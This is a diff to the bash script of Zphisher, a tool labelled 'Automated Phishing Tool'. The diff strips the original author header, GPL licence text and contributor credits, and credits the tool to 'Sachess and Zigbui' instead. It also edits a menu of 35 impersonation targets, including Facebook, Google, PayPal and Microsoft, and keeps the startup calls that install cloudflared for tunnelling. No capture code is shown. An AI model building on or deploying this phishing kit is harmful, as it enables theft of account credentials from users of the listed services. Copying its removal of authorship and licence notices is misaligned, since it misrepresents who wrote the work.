@@ -1,94 +1,3 @@
-#!/bin/bash
-
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
-
-
-##                   GNU GENERAL PUBLIC LICENSE
-##                    Version 3, 29 June 2007
-##
-##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
-##    Everyone is permitted to copy and distribute verbatim copies
-##    of this license document, but changing it is not allowed.
-##
-##                         Preamble
-##
-##    The GNU General Public License is a free, copyleft license for
-##    software and other kinds of works.
-##
-##    The licenses for most software and other practical works are designed
-##    to take away your freedom to share and change the works.  By contrast,
-##    the GNU General Public License is intended to guarantee your freedom to
-##    share and change all versions of a program--to make sure it remains free
-##    software for all its users.  We, the Free Software Foundation, use the
-##    GNU General Public License for most of our software; it applies also to
-##    any other work released this way by its authors.  You can apply it to
-##    your programs, too.
-##
-##    When we speak of free software, we are referring to freedom, not
-##    price.  Our General Public Licenses are designed to make sure that you
-##    have the freedom to distribute copies of free software (and charge for
-##    them if you wish), that you receive source code or can get it if you
-##    want it, that you can change the software or use pieces of it in new
-##    free programs, and that you know you can do these things.
-##
-##    To protect your rights, we need to prevent others from denying you
-##    these rights or asking you to surrender the rights.  Therefore, you have
-##    certain responsibilities if you distribute copies of the software, or if
-##    you modify it: responsibilities to respect the freedom of others.
-##
-##    For example, if you distribute copies of such a program, whether
-##    gratis or for a fee, you must pass on to the recipients the same
-##    freedoms that you received.  You must make sure that they, too, receive
-##    or can get the source code.  And you must show them these terms so they
-##    know their rights.
-##
-##    Developers that use the GNU GPL protect your rights with two steps:
-##    (1) assert copyright on the software, and (2) offer you this License
-##    giving you legal permission to copy, distribute and/or modify it.
-##
-##    For the developers' and authors' protection, the GPL clearly explains
-##    that there is no warranty for this free software.  For both users' and
-##    authors' sake, the GPL requires that modified versions be marked as
-##    changed, so that their problems will not be attributed erroneously to
-##    authors of previous versions.
-##
-##    Some devices are designed to deny users access to install or run
-##    modified versions of the software inside them, although the manufacturer
-##    can do so.  This is fundamentally incompatible with the aim of
-##    protecting users' freedom to change the software.  The systematic
-##    pattern of such abuse occurs in the area of products for individuals to
-##    use, which is precisely where it is most unacceptable.  Therefore, we
-##    have designed this version of the GPL to prohibit the practice for those
-##    products.  If such problems arise substantially in other domains, we
-##    stand ready to extend this provision to those domains in future versions
-##    of the GPL, as needed to protect the freedom of users.
-##
-##    Finally, every program is threatened constantly by software patents.
-##    States should not allow patents to restrict development and use of
-##    software on general-purpose computers, but in those that do, we wish to
-##    avoid the special danger that patents applied to a free program could
-##    make it effectively proprietary.  To prevent this, the GPL assures that
-##    patents cannot be used to render the program non-free.
-##
-##    The precise terms and conditions for copying, distribution and
-##    modification follow.
-##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
-##
-
-##   THANKS TO :
-##   1RaY-1 - https://github.com/1RaY-1
-##   Aditya Shakya - https://github.com/adi1090x
-##   Ali Milani Amin - https://github.com/AliMilani
-##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
-##   Moises Tapia - https://github.com/MoisesTapia
-##   Mr.Derek - https://github.com/E343IO
-##   Mustakim Ahmed - https://github.com/bdhackers009
-##   TheLinuxChoice - https://twitter.com/linux_choice
-
 
 __version__="2.3.5"
 
@@ -103,7 +12,8 @@ REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf
 MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"  PINK="$(printf '\033[38;5;206m')"  YELLOW="$(printf '\033[33m')"  PURPLE="$(printf '\033[35m')"
 HOTPINK="$(printf '\033[38;5;198m')"  ULTRAMARINE="$(printf '\033[38;5;61m')"  CITRUS="$(printf '\033[38;5;226m')"
-BLUEORCHID="$(printf '\033[38;5;99m')"  LIGHTSABER_GREEN="$(printf '\033[38;5;34m')"
+BLUEORCHID="$(printf '\033[38;5;99m')"  LIGHTSABER_GREEN="$(printf '\033[38;5;34m')" TEAL_BLUE="$(printf '\033[38;5;6m')"
+WARM_GRAY="$(printf '\033[38;5;243m')"  SLATE="$(printf '\033[38;5;59m')"
 
 ## Directories
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
@@ -206,16 +116,16 @@ check_status() {
 banner() {
 	cat <<- EOF
 		${HOTPINK}
-		${HOTPINK}   __      __                                _     _     _               
-		${HOTPINK}  |   \  /   |                              | |   (_)   | |              
-		${HOTPINK}  | |\ \/ /| | ___  ,---,__    __    ___ __ | |__  _ ___| |__   ___ _ __ 
-		${HOTPINK}  | | \  / | |/ _ \/ ,-, \ \  /  \  / / '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${HOTPINK}  | |  \/  | |  __/\ '-' /\ \/ /\ \/ /| |_) | | | | \__ \ | | |  __/ |   
-		${HOTPINK}  |_|      |_|\___) '---'  \__/  \__/ | .__/|_| |_|_|___/_| |_|\___|_|   
-		${HOTPINK}                                      | |                                
-		${HOTPINK}                                      |_|                ${ULTRAMARINE}Version : ${__version__}
+		${HOTPINK}   __      __                         ${SLATE}      _     _     _               
+		${HOTPINK}  |   \  /   |                        ${SLATE}     | |   (_)   | |              
+		${HOTPINK}  | |\ \/ /| | ___ ,---,__    __    __${SLATE}_ __ | |__  _ ___| |__   ___ _ __ 
+		${HOTPINK}  | | \  / | |/ _ \ ,-, \ \  /  \  / /${SLATE} '_ \| '_ \| / __| '_ \ / _ \ '__|
+		${HOTPINK}  | |  \/  | |  __/ '-' /\ \/ /\ \/ /${SLATE}| |_) | | | | \__ \ | | |  __/ |   
+		${HOTPINK}  |_|      |_|\___)'---'  \__/  \__/ ${SLATE}| .__/|_| |_|_|___/_| |_|\___|_|   
+		${HOTPINK}                                     ${SLATE}| |                                
+		${HOTPINK}                                     ${SLATE}|_|                ${ULTRAMARINE}Version : ${__version__}
 
-		${RED}[${WHITE}-${RED}]${ULTRAMARINE} Tool Created By Sachess${WHITE}
+		${RED}[${WHITE}-${RED}]${ULTRAMARINE} Tool Created By Sachess and Zigbui${WHITE}
 	EOF
 }
 
@@ -736,13 +646,13 @@ main_menu() {
 		${BLUEORCHID}[${WHITE}01${BLUEORCHID}]${CITRUS} Facebook      ${BLUEORCHID}[${WHITE}11${BLUEORCHID}]${CITRUS} Twitch       ${BLUEORCHID}[${WHITE}21${BLUEORCHID}]${CITRUS} DeviantArt
 		${BLUEORCHID}[${WHITE}02${BLUEORCHID}]${CITRUS} Instagram     ${BLUEORCHID}[${WHITE}12${BLUEORCHID}]${CITRUS} Pinterest    ${BLUEORCHID}[${WHITE}22${BLUEORCHID}]${CITRUS} Badoo
 		${BLUEORCHID}[${WHITE}03${BLUEORCHID}]${CITRUS} Google        ${BLUEORCHID}[${WHITE}13${BLUEORCHID}]${CITRUS} Snapchat     ${BLUEORCHID}[${WHITE}23${BLUEORCHID}]${CITRUS} Origin
-		${BLUEORCHID}[${WHITE}04${BLUEORCHID}]${CITRUS} Microsoft     ${BLUEORCHID}[${WHITE}14${BLUEORCHID}]${CITRUS} Linkedin     ${BLUEORCHID}[${WHITE}24${BLUEORCHID}]${CITRUS} DropBox	
+		${BLUEORCHID}[${WHITE}04${BLUEORCHID}]${CITRUS} bullshit      ${BLUEORCHID}[${WHITE}14${BLUEORCHID}]${CITRUS} Linkedin     ${BLUEORCHID}[${WHITE}24${BLUEORCHID}]${CITRUS} DropBox	
 		${BLUEORCHID}[${WHITE}05${BLUEORCHID}]${CITRUS} Netflix       ${BLUEORCHID}[${WHITE}15${BLUEORCHID}]${CITRUS} Ebay         ${BLUEORCHID}[${WHITE}25${BLUEORCHID}]${CITRUS} Yahoo		
 		${BLUEORCHID}[${WHITE}06${BLUEORCHID}]${CITRUS} Paypal        ${BLUEORCHID}[${WHITE}16${BLUEORCHID}]${CITRUS} Quora        ${BLUEORCHID}[${WHITE}26${BLUEORCHID}]${CITRUS} Wordpress
 		${BLUEORCHID}[${WHITE}07${BLUEORCHID}]${CITRUS} Steam         ${BLUEORCHID}[${WHITE}17${BLUEORCHID}]${CITRUS} Protonmail   ${BLUEORCHID}[${WHITE}27${BLUEORCHID}]${CITRUS} Yandex			
 		${BLUEORCHID}[${WHITE}08${BLUEORCHID}]${CITRUS} Twitter       ${BLUEORCHID}[${WHITE}18${BLUEORCHID}]${CITRUS} Spotify      ${BLUEORCHID}[${WHITE}28${BLUEORCHID}]${CITRUS} StackoverFlow
 		${BLUEORCHID}[${WHITE}09${BLUEORCHID}]${CITRUS} Playstation   ${BLUEORCHID}[${WHITE}19${BLUEORCHID}]${CITRUS} Reddit       ${BLUEORCHID}[${WHITE}29${BLUEORCHID}]${CITRUS} Vk
-		${BLUEORCHID}[${WHITE}10${BLUEORCHID}]${CITRUS} Tiktok        ${BLUEORCHID}[${WHITE}20${BLUEORCHID}]${CITRUS} Adobe        ${BLUEORCHID}[${WHITE}30${BLUEORCHID}]${CITRUS} XBOX
+		${BLUEORCHID}[${WHITE}10${BLUEORCHID}]${CITRUS} Tiktok        ${BLUEORCHID}[${WHITE}20${BLUEORCHID}]${CITRUS} Adobe        ${BLUEORCHID}[${WHITE}30${BLUEORCHID}]${CITRUS} Microsoft
 		${BLUEORCHID}[${WHITE}31${BLUEORCHID}]${CITRUS} Mediafire     ${BLUEORCHID}[${WHITE}32${BLUEORCHID}]${CITRUS} Gitlab       ${BLUEORCHID}[${WHITE}33${BLUEORCHID}]${CITRUS} Github
 		${BLUEORCHID}[${WHITE}34${BLUEORCHID}]${CITRUS} Discord       ${BLUEORCHID}[${WHITE}35${BLUEORCHID}]${CITRUS} Roblox 
 
@@ -897,7 +807,7 @@ main_menu() {
 }
 
 ## Main
-kill_pid
+kill_pid 
 dependencies
 check_status
 install_cloudflared
